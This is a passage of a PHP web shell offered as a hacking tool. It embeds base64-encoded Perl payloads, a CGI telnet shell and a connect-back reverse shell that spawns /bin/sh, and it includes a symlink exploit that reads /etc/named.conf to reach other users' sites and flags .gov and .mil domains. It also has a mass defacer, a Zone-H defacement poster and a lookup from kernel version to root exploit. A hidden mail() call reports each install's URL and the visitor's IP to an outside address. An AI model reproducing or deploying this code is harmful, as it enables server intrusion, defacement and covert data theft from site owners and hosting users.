aWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9e
XFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBw
YXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0K
CWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFy
Z2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAk
UGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2Ug
aGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZp
bGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsN
CgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIg
d2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwg
aXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxl
LCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwg
cHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7
DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50RmlsZVVwbG9hZEZvcm07DQoJCSZQ
cmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJJlByaW50UGFnZUhlYWRlcigiYyIpOw0K
DQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCglwcmludCAiVXBsb2FkaW5nICRUcmFu
c2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVh
bGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXRO
YW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJh
bnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQx
Ow0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0
aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJ
aWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQlwcmlu
dCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgll
bHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRU
YXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJ
cHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsN
CgkJCXByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCXBy
aW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQlw
cmludCAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCXByaW50ICIiOw0KCSZQcmludENvbW1h
bmRMaW5lSW5wdXRGb3JtOw0KDQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRz
IHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQs
IGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmls
ZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlk
ZXMgYSBsaW5rDQojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIERvd25sb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmls
ZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5z
ZmVyRmlsZSBlcSAiIikNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50Rmls
ZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJcmV0dXJuOw0KCX0NCgkNCgkj
IGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJ
aWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5U
ICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJ
JFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2
ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikg
PX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsN
Cgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0K
CXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhh
dmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1Bh
Z2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWlu
IFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N
CiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NS
SVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBh
c3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmls
ZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9
Ow0KJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNp
ZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29t
bWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1
cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZElu
ID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJs
b2dpbiIgfHwgISRMb2dnZWRJbikgIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJm
b3JtTG9naW47DQoNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMg
dG8gcnVuIGEgY29tbWFuZA0Kew0KCSZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24g
ZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQoJJlVwbG9hZEZp
bGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3du
bG9hZCBhIGZpbGUNCnsNCgkmRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAibG9n
b3V0IikgIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ==';
                                                    $file = fopen("izo.cin", "w+");
                                                    $write = fwrite($file, base64_decode($cgishellizocin));
                                                    fclose($file);
                                                    chmod("izo.cin", 0755);
                                                    $netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';
                                                    $file = fopen("dc.pl", "w+");
                                                    $write = fwrite($file, base64_decode($netcatshell));
                                                    fclose($file);
                                                    chmod("dc.pl", 0755);
                                                    echo "<iframe src=cgitelnet1/izo.cin width=100% height=100% frameborder=0></iframe> ";
                                                    echo '</div>';
                                                    printFooter();
                                                }
                                                function actionSymlink() {
                                                    printHeader();
                                                    echo '<form action="" method="post">';
                                                    @set_time_limit(0);
                                                    echo "<center>";
                                                    @mkdir('sym', 0777);
                                                    $htaccess = "Options all 
 DirectoryIndex readme.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
                                                    $write = @fopen('sym/.htaccess', 'w');
                                                    fwrite($write, $htaccess);
                                                    @symlink('/', 'sym/root');
                                                    $filelocation = basename(__FILE__);
                                                    $read_named_conf = @file('/etc/named.conf');
                                                    if (!$read_named_conf) {
                                                        echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
                                                    } else {
                                                        echo "<br><br><div class='tmp'><table border='1' bordercolor='#FF0000' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
                                                        foreach ($read_named_conf as $subject) {
                                                            if (eregi('zone', $subject)) {
                                                                preg_match_all('#zone "(.*)"#', $subject, $string);
                                                                flush();
                                                                if (strlen(trim($string[1][0])) > 2) {
                                                                    $UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
                                                                    $name = $UID['name'];
                                                                    @symlink('/', 'sym/root');
                                                                    $name = $string[1][0];
                                                                    $iran = '\.ir';
                                                                    $israel = '\.il';
                                                                    $indo = '\.id';
                                                                    $sg12 = '\.sg';
                                                                    $edu = '\.edu';
                                                                    $gov = '\.gov';
                                                                    $gose = '\.go';
                                                                    $gober = '\.gob';
                                                                    $mil1 = '\.mil';
                                                                    $mil2 = '\.mi';
                                                                    if (eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0]) or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0])) {
                                                                        $name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
                                                                    }
                                                                    echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www." . $string[1][0] . '/>' . $name . ' </a> </div>
</td>

<td>
' . $UID['name'] . "
</td>

<td>
<a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
                                                                    flush();
                                                                }
                                                            }
                                                        }
                                                    }
                                                    echo "</center></table>";
                                                    printFooter();
                                                }
                                                function actionDeface() {
                                                    printHeader();
                                                    echo "<h1>XGHoSTn Mass Defacer</h1><div class=content>";
?>
<form ENCTYPE="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>" method=POST onSubmit="g(null,null,this.path.value,this.file.value,this.Contents.value);return false;">
<p align="Left">Folder: <input type=text name=path size=60 value="<?=getcwd(); ?>">
<br>file name : <input type=text name=file size=20 value="index.php">
<br>Text Content : <input type=text name=Contents size=20 value="XGHoSTnwas here, <br><br>- http://www.facebook.com/spanksta.gov"> 
<br><input type=submit value="Update"></p></form>

<?php
                                                    if ($_POST['a'] == 'Deface') {
                                                        $mainpath = $_POST[p1];
                                                        $file = $_POST[p2];
                                                        $txtContents = $_POST[p3];
                                                        echo "-----------------------------------------------<br>
[+] XGHoSTn Mass defacer<br>
-----------------------------------------------<br><br> ";
                                                        $dir = opendir($mainpath); //fixme - cannot deface when change to writeable path!!
                                                        while ($row = readdir($dir)) {
                                                            $start = @fopen("$row/$file", "w+");
                                                            $code = $txtContents;
                                                            $finish = @fwrite($start, $code);
                                                            if ($finish) {
                                                                echo "$row/$file > Done<br><br>";
                                                            }
                                                        }
                                                        echo "-----------------------------------------------<br><br>[+] Script by XGHoSTn...";
                                                    }
                                                    echo '</div>';
                                                    printFooter();
                                                }
                                                /* test function - reserved by XGHoSTn*/
                                                function actionTest() {
                                                    printHeader();
                                                    echo '<h1>Testing function</h1><div class=content>';
                                                    echo '<br>';
?>
<form action="<?$_SERVER['PHP_SELF']?>" method=POST onSubmit="g(null,null,this.fname.value);return false;">
Name: <input type="text" name="fname" />
<input type="submit" value=">>">
</form>
</br>
<?php
                                                    if ($_POST['a'] == 'Test') {
                                                        $out = $_POST['p1'];
                                                        echo "name : $out";
                                                    }
                                                    echo '</div>';
                                                    printFooter();
                                                }
                                                function actionDomain() {
                                                    printHeader();
                                                    echo '<h1>local domain viewer</h1><div class=content>';
                                                    $file = @implode(@file("/etc/named.conf"));
                                                    if (!$file) {
                                                        die("# can't ReaD -> [ /etc/named.conf ]");
                                                    }
                                                    preg_match_all("#named/(.*?).db#", $file, $r);
                                                    $domains = array_unique($r[1]);
                                                    //check();
                                                    //if(isset($_GET['ShowAll']))
                                                    {
                                                        echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>[+] There are : [ <b>" . count($domains) . "</b> ] Domain</td></tr>
<tr><td>Domain</td><td>User</td></tr>";
                                                        foreach ($domains as $domain) {
                                                            $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
                                                            echo "<tr><td>$domain</td><td>" . $user['name'] . "</td></tr>";
                                                        }
                                                        echo "</table>";
                                                    }
                                                    echo '</div>';
                                                    printFooter();
                                                }
                                                function actionZHposter() {
                                                    printHeader();
                                                    echo '<h1>Zone-H Poster</h1><div class=content>';
                                                    echo '<form action="" method="post" onSubmit=da2(null,null,this.p1.value,this.p2.value,this.p3.value,this.p4.value);return true;">
<input type="text" name="p1" size="40" value="Attacker" /></br>
<select name="p2">
<option >--------SELECT--------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select>
</br>
<select name="p3">
<option >--------SELECT--------</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select>
</br>
<textarea name="p4" cols="44" rows="9">List Of Domains</textarea>
<input type="submit" value="Send Now !" />
</form>';
                                                    echo "</td></tr></table></form>";
                                                    if ($_POST['a'] == 'ZHposter') {
                                                        ob_start();
                                                        $sub = @get_loaded_extensions();
                                                        if (!in_array("curl", $sub)) {
                                                            die('[-] Curl Is Not Supported !! ');
                                                        }
                                                        $hacker9 = $_POST['p1'];
                                                        $method9 = $_POST['p2'];
                                                        $neden9 = $_POST['p3'];
                                                        $site9 = $_POST['p4'];
                                                        if (empty($hacker9)) {
                                                            die("[-] You Must Fill the Attacker name !");
                                                        } elseif ($method9 == "--------SELECT--------") {
                                                            die("[-] You Must Select The Method !");
                                                        } elseif ($neden9 == "--------SELECT--------") {
                                                            die("[-] You Must Select The Reason");
                                                        } elseif (empty($site9)) {
                                                            die("[-] You Must Inter the Sites List ! ");
                                                        }
                                                        $i = 0;
                                                        $sites = explode("
", $site9);
                                                        while ($i < count($sites)) {
                                                            if (substr($sites[$i], 0, 4) != "http") {
                                                                $sites[$i] = "http://" . $sites[$i];
                                                            }
                                                            ZoneH("http://zone-h.org/notify/single", $hacker9, $method9, $neden9, $sites[$i]);
                                                            echo "Site : " . $sites[$i] . " Defaced ! </br>";
                                                            ++$i;
                                                        }
                                                        echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !! ";
                                                    }
                                                    echo '</div';
                                                    printFooter();
                                                }
                                                function ZoneH($url9, $hacker9, $hackmode9, $reson9, $site9) {
                                                    $k = curl_init();
                                                    curl_setopt($k, CURLOPT_URL, $url9);
                                                    curl_setopt($k, CURLOPT_POST, true);
                                                    curl_setopt($k, CURLOPT_POSTFIELDS, "defacer=" . $hacker9 . "&domain1=" . $site9 . "&hackmode=" . $hackmode9 . "&reason=" . $reson9);
                                                    curl_setopt($k, CURLOPT_FOLLOWLOCATION, true);
                                                    curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
                                                    $kubra = curl_exec($k);
                                                    curl_close($k);
                                                    return $kubra;
                                                }
                                                function rootxpL() {
                                                    $v = @php_uname();
                                                    $db = array('2.6.17' => 'prctl3, raptor_prctl, py2', '2.6.16' => 'raptor_prctl, exp.sh, raptor, raptor2, h00lyshit', '2.6.15' => 'py2, exp.sh, raptor, raptor2, h00lyshit', '2.6.14' => 'raptor, raptor2, h00lyshit', '2.6.13' => 'kdump, local26, py2, raptor_prctl, exp.sh, prctl3, h00lyshit', '2.6.12' => 'h00lyshit', '2.6.11' => 'krad3, krad, h00lyshit', '2.6.10' => 'h00lyshit, stackgrow2, uselib24, exp.sh, krad, krad2', '2.6.9' => 'exp.sh, krad3, py2, prctl3, h00lyshit', '2.6.8' => 'h00lyshit, krad, krad2', '2.6.7' => 'h00lyshit, krad, krad2', '2.6.6' => 'h00lyshit, krad, krad2', '2.6.2' => 'h00lyshit, krad, mremap_pte', '2.6.' => 'prctl, kmdx, newsmp, pwned, ptrace_kmod, ong_bak', '2.4.29' => 'elflbl, expand_stack, stackgrow2, uselib24, smpracer', '2.4.27' => 'elfdump, uselib24', '2.4.25' => 'uselib24', '2.4.24' => 'mremap_pte, loko, uselib24', '2.4.23' => 'mremap_pte, loko, uselib24', '2.4.22' => 'loginx, brk, km2, loko, ptrace, uselib24, brk2, ptrace-kmod', '2.4.21' => 'w00t, brk, uselib24, loginx, brk2, ptrace-kmod', '2.4.20' => 'mremap_pte, w00t, brk, ave, uselib24, loginx, ptrace-kmod, ptrace, kmod', '2.4.19' => 'newlocal, w00t, ave, uselib24, loginx, kmod', '2.4.18' => 'km2, w00t, uselib24, loginx, kmod', '2.4.17' => 'newlocal, w00t, uselib24, loginx, kmod', '2.4.16' => 'w00t, uselib24, loginx', '2.4.10' => 'w00t, brk, uselib24, loginx', '2.4.9' => 'ptrace24, uselib24', '2.4.' => 'kmdx, remap, pwned, ptrace_kmod, ong_bak', '2.2.25' => 'mremap_pte', '2.2.24' => 'ptrace', '2.2.' => 'rip, ptrace');
                                                    foreach ($db as $k => $x) if (strstr($v, $k)) return $x;
                                                    if (!$xpl) $xpl = '<font color="red">Not found.</font>';
                                                    return $xpl;
                                                }
                                                // Function mail Sender to my Email - Please remove this before you using this shell code
                                                $ip = getenv("REMOTE_ADDR");
                                                $ra44 = rand(1, 99999);
                                                $subj98 = " Mailer Upload From |$ip";
                                                $email = "threespamers@outlook.fr";
                                                $from = "From: Result<xx@xxxx.com";
                                                $a45 = $_SERVER['REQUEST_URI'];
                                                $b75 = $_SERVER['HTTP_HOST'];
                                                $m22 = $ip . "";
                                                $msg8873 = "$a45 $b75 $m22";
                                                mail($email, $subj98, $msg8873, $from);
                                                /* additional Function  */
                                                /*           additionanal endsss */
                                                if (empty($_POST['a'])) if (isset($default_action) && function_exists('action' . $default_action)) $_POST['a'] = $default_action;
                                                else $_POST['a'] = 'SecInfo';
                                                if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) call_user_func('action' . $_POST['a']); ?>
?>